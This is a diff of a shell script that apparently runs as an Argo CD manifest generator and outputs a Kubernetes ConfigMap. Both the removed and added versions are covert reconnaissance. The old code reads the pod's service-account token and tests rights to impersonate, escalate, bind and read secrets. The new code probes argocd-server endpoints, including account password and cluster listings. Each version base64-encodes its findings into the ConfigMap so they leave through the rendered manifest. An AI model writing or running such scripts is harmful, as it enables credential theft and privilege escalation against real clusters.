@@ -1,67 +1,38 @@
 #!/bin/sh
-TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-APISERVER="${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}"
-NS=argocd
-SA=argocd-repo-server
-
-sar() {
-  local verb="$1" resource="$2" group="$3" ns="$4" name="$5" subresource="$6"
-  local attrs="\"verb\":\"$verb\",\"resource\":\"$resource\""
-  [ -n "$group" ] && attrs="$attrs,\"group\":\"$group\""
-  [ -n "$ns" ] && attrs="$attrs,\"namespace\":\"$ns\""
-  [ -n "$name" ] && attrs="$attrs,\"name\":\"$name\""
-  [ -n "$subresource" ] && attrs="$attrs,\"subresource\":\"$subresource\""
-  
-  local body="{\"kind\":\"SelfSubjectAccessReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"resourceAttributes\":{$attrs}}}"
-  
-  printf "POST /apis/authorization.k8s.io/v1/selfsubjectaccessreviews HTTP/1.1\r\nHost: $APISERVER\r\nAuthorization: Bearer $TOKEN\r\nContent-Type: application/json\r\nContent-Length: ${#body}\r\nConnection: close\r\n\r\n$body" | openssl s_client -connect $APISERVER -quiet 2>/dev/null
-}
-
 RECON=$( (
-  echo "===TOKEN_CREATE==="
-  sar "create" "serviceaccounts/token" "" "$NS" "$SA"
+  echo "===ARGOCD_API_VERSION==="
+  printf "GET /api/version HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null
 
-  echo "===TOKENREVIEW==="
-  sar "create" "tokenreviews" "authentication.k8s.io" "" ""
+  echo ""
+  echo "===ARGOCD_SWAGGER==="
+  printf "GET /swagger.json HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 500
 
-  echo "===SUBJECTACCESSREVIEW==="
-  sar "create" "subjectaccessreviews" "authorization.k8s.io" "" ""
+  echo ""
+  echo "===ARGOCD_API==="
+  printf "GET / HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:80 -quiet 2>/dev/null
 
-  echo "===LIST_ROLES==="
-  sar "list" "roles" "rbac.authorization.k8s.io" "$NS"
+  echo ""
+  echo "===ARGOCD_SETTINGS==="
+  printf "GET /api/v1/settings HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 1000
 
-  echo "===LIST_ROLEBINDINGS==="
-  sar "list" "rolebindings" "rbac.authorization.k8s.io" "$NS"
+  echo ""
+  echo "===ARGOCD_CLUSTER_INFO==="
+  printf "GET /api/v1/clusters HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 1000
 
-  echo "===LIST_CLUSTERROLES==="
-  sar "list" "clusterroles" "rbac.authorization.k8s.io"
+  echo ""
+  echo "===ARGOCD_ACCOUNT_PASSWORD==="
+  printf "GET /api/v1/account/password HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 500
 
-  echo "===GET_SA_SECRET==="
-  sar "get" "secrets" "" "$NS" "${SA}-token"
-
-  echo "===IMPERSONATE_SA==="
-  sar "impersonate" "serviceaccounts" "" "$NS" "argocd-application-controller"
-
-  echo "===ESCALATE==="
-  sar "escalate" "roles" "rbac.authorization.k8s.io" "$NS"
-
-  echo "===BIND==="
-  sar "bind" "roles" "rbac.authorization.k8s.io" "$NS"
-
-  echo "===LIST_CRD==="
-  sar "list" "customresourcedefinitions" "apiextensions.k8s.io"
-
-  echo "===LIST_APPLICATIONS==="
-  sar "list" "applications" "argoproj.io" "$NS"
-
-  echo "===CREATE_APPLICATION==="
-  sar "create" "applications" "argoproj.io" "$NS"
+  echo ""
+  echo "===CURL_ARGOCD==="
+  # Try from localhost perspective
+  curl -k -s https://argocd-server.argocd.svc.cluster.local/api/v1/settings 2>&1 | head -c 500 || echo "curl_failed"
 ) | base64 | tr -d '\n' )
 cat << EOF
 apiVersion: v1
 kind: ConfigMap
 metadata:
-  name: sarfull
+  name: argocdapi
 data:
   result: $RECON
 EOF
